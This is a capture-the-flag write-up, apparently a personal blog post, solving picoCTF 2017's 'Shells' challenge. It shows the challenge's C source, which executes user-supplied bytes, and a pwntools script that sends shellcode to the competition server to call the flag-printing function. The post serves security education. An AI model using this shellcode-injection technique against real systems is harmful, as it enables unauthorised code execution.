Title: PicoCTF 2017 Lvl2 Shells
Date: 2018-7-27 10:02
Modified: 2018-7-27 10:02
Category: ctf
Tags: ctf, pwnable, binary exploitation
Slug: picoCTF_lvl2Shells
Authors: F3real
Summary: How to solve picoCTF Lvl2 Shells

picoCTF is another interesting CTF competition found at [https://2017.picoctf.com/](https://2017.picoctf.com)

We will take a look at one of binary exploitation challenges, Shells.

>How much can a couple bytes do? Use [shells](https://webshell2017.picoctf.com/static/8ee8b9f60eb42472a741748770af94ff/shells) ! [Source](https://webshell2017.picoctf.com/static/8ee8b9f60eb42472a741748770af94ff/shells.c). Connect on shell2017.picoctf.com:55049.

First lets, look at source code:

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

#define AMOUNT_OF_STUFF 10

//TODO: Ask IT why this is here
void win(){
    system("/bin/cat ./flag.txt");    
}


void vuln(){
    char * stuff = (char *)mmap(NULL, AMOUNT_OF_STUFF, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
    if(stuff == MAP_FAILED){
        printf("Failed to get space. Please talk to admin\n");
        exit(0);
    }
    printf("Give me %d bytes:\n", AMOUNT_OF_STUFF);
    fflush(stdout);
    int len = read(STDIN_FILENO, stuff, AMOUNT_OF_STUFF);
    if(len == 0){
        printf("You didn't give me anything :(");
        exit(0);
    }
    void (*func)() = (void (*)())stuff;
    func();      
}

int main(int argc, char*argv[]){
    printf("My mother told me to never accept things from strangers\n");
    printf("How bad could running a couple bytes be though?\n");
    fflush(stdout);
    vuln();
    return 0;
}
~~~

From source code we can see that we need to call `win` function. In `vuln` we see that program maps memory for user input and sets read/write/execute permission on it. After that it, in this strange looking line of code,

    void (*func)() = (void (*)())stuff;

casts input buffer to `void f()` and assigns it to function pointer. For example if we wanted to cast to something like `int f(char a, int b)` we would use `(int (*)(char,int))`.

First we need to find address of `win` function in shells binary, we can use **objdump** for this:

    objdump -d shells -M intel

![objdump disasembly of win function]({static}/images/2018_7_27_Shells.png){: .img-fluid .centerimage}

And we get function address `0x08048540`.

My first idea was just to pass function address but it didn’t work since we need actual assembly code. So lets write some shellcode using **pwntools**:

~~~python
from pwn import *
         
context.arch = 'i386'
context.terminal = 'tmux'

r = remote('shell2017.picoctf.com', 55049)
print r.recvuntil('Give me 10 bytes:')
payload = asm('mov eax, 0x08048540') + asm('call eax')
r.send(payload)
print r.recvall()
r.close()
~~~

We just set context so **pwntools** knows arch of the system, connect to server and send our shellcode:

    move eax, 0x08048540
    call eax

We call from register since in that case value is interpreted as absolute address offset instead of relative (if we just used `call 0x08048540`).

Also we could have just used push/ret shellcode.

    push 0x08048540
    ret

In any case running our python scripts gives us the flag :D
